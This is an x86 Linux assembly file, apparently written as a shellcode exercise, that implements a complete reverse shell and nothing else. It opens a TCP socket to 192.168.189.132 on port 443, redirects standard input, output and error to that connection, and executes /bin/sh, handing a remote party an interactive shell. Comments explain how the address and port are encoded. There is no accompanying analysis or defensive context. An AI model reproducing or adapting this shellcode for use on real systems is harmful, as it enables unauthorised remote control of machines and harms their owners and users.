global _start
section .text
_start:
	xor eax, eax
	xor ebx, ebx
	push eax
	push eax
	
	push 0x84bda8c0		; 192.168.189.132 = 3232284036 = 0xC0A8BD84
	mov bx, 0x0bb01 	; 443 = 0x1bb
	shl ebx, 16		; Pass port to higher word in register
	add bl, 0x02		; AF_INET = 2
	push ebx		; ebx = 0xbb010002
	
	push eax
	push 0x01
	push 0x02
		
	mov al, 0x66		; SYS_SOCKETCALL
	xor ebx, ebx	
	mov bl, 0x01
	mov ecx, esp
	int 0x80

	push 16
	lea ebx, [esp + 16]
	push ebx
	push eax
	xor eax, eax
	mov al, 0x66		; SYS_SOCKETCALL
	xor ebx, ebx
	mov bl, 0x03
	mov ecx, esp
	int 0x80

	mov ebx, dword[esp]
	xor eax, eax
	xor ecx, ecx
again:
	mov al, 0x3f
	int 0x80
	inc ecx
	cmp ecx, 0x03
	jne again

	xor eax, eax
	push eax
	mov ecx, eax
	mov edx, eax
	mov al, 0x0b
	push "//sh"
	push "/bin"
	mov ebx, esp
	int 0x80
